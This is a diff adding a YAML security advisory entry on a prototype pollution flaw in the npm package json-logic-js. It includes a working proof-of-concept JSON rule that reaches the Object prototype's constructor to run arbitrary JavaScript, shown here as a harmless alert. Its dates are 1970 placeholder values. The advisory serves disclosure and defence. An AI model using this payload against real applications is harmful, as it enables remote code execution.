@@ -1,0 +1,35 @@
+---
+- id: npmjs:npm:json-logic-js:1542
+  title: Prototype Pollution
+  description: |-
+    All versions of `json-logic-js` are vulnerable to Prototype Pollution.  The `method` operation allows a malicious user to modify the prototype of `Object` through the method property name. This causes modification of any existing property that will exist on all objects and leads to Remote Code Execution.
+
+    The following rule creates a popup when run from a browser:
+    ```
+    {
+      "method": [
+        {
+          "method": [
+            {
+              "var": "__proto__.constructor.is.__proto__"
+            },
+            "constructor",
+            [
+              "var x = 'SECURITY!'; console.log(x, window.fetch); alert(x)"
+            ]
+          ]
+        },
+        "call"
+      ]
+    }
+    ```
+  affected_package: json-logic-js
+  vulnerable_versions:
+  - ">=0.0.0"
+  severity: high
+  package_manager: npm
+  cwe: CWE-471
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Arel Cordero
